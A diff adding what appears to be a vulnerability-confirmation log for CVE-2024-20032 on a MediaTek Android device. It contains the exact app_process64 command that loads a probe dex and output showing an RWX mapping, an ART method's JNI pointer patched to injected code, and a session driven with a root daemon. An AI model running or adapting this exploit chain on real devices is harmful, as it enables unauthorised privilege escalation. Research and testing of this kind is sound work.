@@ -1,0 +1,39 @@
+command=CLASSPATH=/data/data/com.android.settings/cache/apusys_ioctl_probe.dex app_process64 /system/bin AeeSessionProbe --socket=com.mtk.aee.aed_64 --ind=11 --class=13 --spawn-named=system_server --flags=2000 --no-dump-check --max-reqs=20
+probe=aee-session
+dex_md5=c474876326463ff135b9e3f8abc01545
+dex_sha256=8f6a126206b503f8e90648478496cb6b12070195e20b7823dbad279bf1ddfa32
+remote_dex=/data/data/com.android.settings/cache/apusys_ioctl_probe.dex
+shell_port=127.0.0.1:48888
+exit_status=0
+
+uid=1000(system) gid=1000(system) groups=1000(system),3003(inet) context=u:r:system_app:s0
+u:r:system_app:s0
+c474876326463ff135b9e3f8abc01545  /data/data/com.android.settings/cache/apusys_ioctl_probe.dex
+[spawn_named] exec '/data/data/com.android.settings/cache/system_server 90' -> pid=29336
+[spawn_named] PID=29336 cmdline='/data/data/com.android.settings/cache/system_server'
+[AeeSessionProbe] CVE-2024-20032 session driver
+[AeeSessionProbe] uid=1000 pid=29315 target_pid=29336 class=13 ind=11 flags=0x2000 payload=false
+[+] Scratch buffer at 0x7a31437000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7a31436000
+[+] Wrote syscall stub: JNI@+0x00 (36B), call stub JNI@+0x80 (40B); entry_point left untouched
+[*] ArtMethod for nativeSyscall at 0x7a28604c88
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x7781a1a2c0
+    entry_point    = 0x1038000876b7c578
+[*] Patching data_ (JNI) → 0x7a31436000
+    data_       = 0x7a31436000 ✓
+    entry_point = 0x1038000876b7c578 (unchanged)
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[session] @com.mtk.aee.aed_64 connected peer_uid=0
+[session] IND ind=11 class=13 pid=29336 flags=0x2000 payload=0
+[session] IND bytes: 02 00 00 00 0b 00 00 00 98 72 00 00 0d 00 00 00 00 00 00 00 00 20 00 00
+[session] REQ#0 type=0 cmd=43(REQ_TRIG_TIME) seq=0 payload=0
+[session] REQ#1 type=2 cmd=16(IND_LOG_CLOSE) seq=0 payload=0
+[session] daemon IND cmd=16(IND_LOG_CLOSE) — session CLOSED
+[session] *** SUCCESS: 1 REQ/RSP exchanges on @com.mtk.aee.aed_64 ***
+[result] CVE_2024_20032=CONFIRMED — system_app drove full session with root aee daemon
+
+[phase-check] skipped (--no-dump-check)
